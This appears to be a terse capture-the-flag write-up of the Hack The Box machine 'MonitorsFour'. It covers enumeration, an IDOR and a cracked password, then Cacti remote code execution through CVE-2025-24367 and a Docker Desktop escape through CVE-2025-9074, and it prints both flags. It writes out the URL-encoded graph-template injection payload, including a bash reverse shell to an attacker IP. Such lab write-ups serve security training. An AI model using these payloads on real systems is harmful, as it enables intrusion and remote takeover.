
![](https://cdn-images-1.medium.com/max/1000/1*OFnJ-8mAN1DRuv7IlS5z3w.png)

check the website

![](https://cdn-images-1.medium.com/max/1000/1*LAhpXYNBBsKm02ofggXsqQ.png)

so,dirsearch at first

![](https://cdn-images-1.medium.com/max/1000/1*PFc8ygJGXbcBuIbGx-zWTg.png)

wow,/.env

 so, we download this

![](https://cdn-images-1.medium.com/max/1000/1*ejUw8Xc8Y7fQk96ZzhSInw.png)

![](https://cdn-images-1.medium.com/max/1000/1*kxEhrbf6B6EK69cTR-4G5g.png)

ohh,nmap for sure

![](https://cdn-images-1.medium.com/max/1000/1*N3FYevkH8wS5rhDxDoaTjw.png)

we got 5985 to connect

ok,check other potions

![](https://cdn-images-1.medium.com/max/1000/1*ryTnWydLGDOMHVqw714RUw.png)

so we enter an token

![](https://cdn-images-1.medium.com/max/1000/1*bS__--Y3_sObHO8zONIg8Q.png)

idor

so,we found md5hash,and found the password

![](https://cdn-images-1.medium.com/max/1000/1*lg-O2jVdq9EYAmv3VWBtjA.png)

with admin:wonderful1

we login the monitorsfour

![](https://cdn-images-1.medium.com/max/1000/1*ctznwxaNXmnExfiQBwCyoQ.png)

unfortunately,we cant get any useful information here

so,change my way

![](https://cdn-images-1.medium.com/max/1000/1*ZxiDjkNE5vCWmDFpfx-HOg.png)

add cacti.monitorsfour.htb to /etc/hosts

than check the cacti.monitorsfour.htb

![](https://cdn-images-1.medium.com/max/1000/1*pAp0iJYoZ_IbCf7g5-QA5A.png)

use admin:wonderful1,but wrong 

after a lot searching 

we found admin set his ture name as the username

so 

marcus:wonderful1

![](https://cdn-images-1.medium.com/max/1000/1*4w4l1ZEErT6LPYZrIpg5Cg.png)

yes we log in

than,cve-2025–24367

![](https://cdn-images-1.medium.com/max/1000/1*JCf7CZ3ybUzuIhnpPzkfvA.png)

Console → Templates → Graph

![](https://cdn-images-1.medium.com/max/1000/1*8qAYl-xFJEGlLgBLxpYqKg.png)

change right axis label like

XXX  
create my.rrd — step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200  
graph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?>

# URLEncode  
XXX%0Acreate+my.rrd+ — step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+vulhub.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3Dphpinfo%28%29%3B%3F%3E%0A

for me ,my payload is 

XXX%0Acreate+my2.rrd+ — step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+shell.php+-s+now+-a+CSV+DEF%3Aout%3Dmy2.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3Dsystem%28%22bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.16.13%2F4446+%3C%261%27%22%29%3B%3F%3E

![](https://cdn-images-1.medium.com/max/1000/1*ystuYvKnwlviUL9izuw78A.png)

![](https://cdn-images-1.medium.com/max/1000/1*0nSBVoees21mcdTptpvtXQ.png)

save,than use this to create a graph

![](https://cdn-images-1.medium.com/max/1000/1*4flgcAKCz0cVtfxz8Forug.png)

![](https://cdn-images-1.medium.com/max/1000/1*x75GiGQhqpiwu8Sn83Nrew.png)

![](https://cdn-images-1.medium.com/max/1000/1*wgRK-ol080CnqJo5d4wtgQ.png)

but we got this,

so use 

CVE-2025–24367-Cacti-PoC

to attack clearly

![](https://cdn-images-1.medium.com/max/1000/1*H6iXRkkBLN-8M3H4XOK5jw.png)

we got it ,the user flag

**8a2583f5027022b8397f4d76eebe837c**

and we found almost nothing we can use

![](https://cdn-images-1.medium.com/max/1000/1*xtt1UA5neYUImVmfwjBqTg.png)

so, maybe it is docker

![](https://cdn-images-1.medium.com/max/1000/1*cWFvHC6-kHOf_DxbmJ1W5Q.png)

the tag shows everthing(

![](https://cdn-images-1.medium.com/max/1000/1*AzoYsDOksVkaZ58-u-YiHw.png)

yes,docker

and it must be docker desktop

![](https://cdn-images-1.medium.com/max/1000/1*YnMMR1Dp1L2DY0bYKUT6MQ.png)

### CVE-2025–9074

so ,use it 

![](https://cdn-images-1.medium.com/max/1000/1*ZdhiUIbSg8EAJ-0nrBisLw.png)

yes,it works 

so,

make a json at attacker

container.json

![](https://cdn-images-1.medium.com/max/1000/1*yNtVsWN_D1exc6qGjhg16Q.png)

than wget it

and use it

![](https://cdn-images-1.medium.com/max/1000/1*6OgpSB7ZMYfUnidujmGgyw.png)

![](https://cdn-images-1.medium.com/max/1000/1*Bp7udeQOqPFkgV1kB4qRbw.png)

![](https://cdn-images-1.medium.com/max/1000/1*D142q7XhL4ch66_EV2bRCQ.png)

 we got root flag 

**_fe8da300b16995c19f582952ab3cd3d3_**